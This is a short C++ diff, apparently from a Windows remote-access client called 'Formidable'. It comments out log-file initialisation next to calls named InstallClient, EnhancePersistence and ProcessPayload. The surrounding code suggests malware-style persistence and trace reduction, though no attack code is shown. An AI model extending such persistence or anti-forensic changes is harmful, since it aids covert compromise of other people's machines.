@@ -55,7 +55,7 @@ void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
     std::atomic<bool> bShouldExit(false);
     std::atomic<bool> bConnected(false);
     
-    Formidable::Client::Utils::Logger::Init("client_svc.log");
+    // Formidable::Client::Utils::Logger::Init("client_svc.log");
     Formidable::Client::Core::AutomationManager::Initialize();
     Formidable::Client::Core::AutomationManager::Start();
 
@@ -92,7 +92,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     InstallClient();
     Formidable::Client::Security::PersistenceOptimizer::EnhancePersistence();
     ProcessPayload();
-    Formidable::Client::Utils::Logger::Init("client.log");
+    // Formidable::Client::Utils::Logger::Init("client.log");
     Formidable::Client::Core::AutomationManager::Initialize();
     Formidable::Client::Core::AutomationManager::Start();
 
